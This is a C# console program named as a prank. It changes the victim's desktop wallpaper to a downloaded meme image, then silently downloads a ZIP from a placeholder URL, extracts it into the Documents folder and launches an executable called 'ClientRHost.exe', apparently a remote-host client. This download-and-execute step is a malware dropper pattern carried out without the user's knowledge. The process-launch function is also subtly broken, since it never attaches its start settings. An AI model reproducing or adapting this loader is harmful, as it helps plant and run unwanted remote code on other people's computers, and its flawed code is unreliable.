using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Prikolchik
{
    internal class Program
    {
        // Import dll to change wallpaper
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        private const string ZIP_URL = "https://example.com/file.zip";
        private const string IMG_URL = "https://zastavki.gas-kvas.com/uploads/posts/2024-09/zastavki-gas-kvas-com-6iu0-p-zastavki-na-rabochii-stol-gachimuchi-1.jpg";
        static void Main(string[] args)
        {
            string DOCUMENTS_PATH = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string walpaperPath = Path.Combine(DOCUMENTS_PATH, "WalImg.jpg");

            DownloadFile(IMG_URL, walpaperPath);
            ChangeWallpaper(walpaperPath);

            string extractPath = Path.Combine(DOCUMENTS_PATH, "win-x64");
            DownloadZIPandExtract(ZIP_URL, extractPath);

            string exePath = Path.Combine(extractPath, "ClientRHost.exe");
            StartProcess(exePath);
        }
        public static bool DownloadZIPandExtract(string url, string extractPath)
        {
            string tempFile = Path.GetTempFileName();
            using (var client = new System.Net.WebClient())
            {
                client.DownloadFile(url, tempFile);
            }
            System.IO.Compression.ZipFile.ExtractToDirectory(tempFile, extractPath);
            File.Delete(tempFile);
            return true;
        }

        public static bool DownloadFile(string url, string savePath)
        {
            using (var client = new System.Net.WebClient())
            {
                client.DownloadFile(url, savePath);
            }
            return true;
        }

        public static bool StartProcess(string filePath)
        {
            var process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath
            };
            process.Start();
            return true;
        }

        public static bool ChangeWallpaper(string filePath)
        {
            return SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
